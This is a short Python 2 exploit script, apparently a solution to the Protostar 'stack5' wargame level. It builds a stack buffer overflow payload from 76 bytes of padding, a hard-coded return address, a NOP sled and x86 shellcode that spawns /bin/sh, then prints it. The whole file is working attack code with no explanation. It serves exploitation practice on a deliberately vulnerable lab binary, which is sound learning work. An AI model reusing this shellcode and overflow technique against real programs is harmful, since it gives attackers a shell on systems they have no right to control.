#!usr/bin/env python 


#protostar stack5

import struct


Offset = "A"*76


eip=struct.pack("I",0xbffff7b8)

nop = "\x90"*100


shell = ("\x31\xc0\x50\x68\x2f\x2f\x73"
         "\x68\x68\x2f\x62\x69\x6e\x89"
         "\xe3\x89\xc1\x89\xc2\xb0\x0b"
         "\xcd\x80\x31\xc0\x40\xcd\x80")



execute = Offset + eip + nop + shell 


print execute









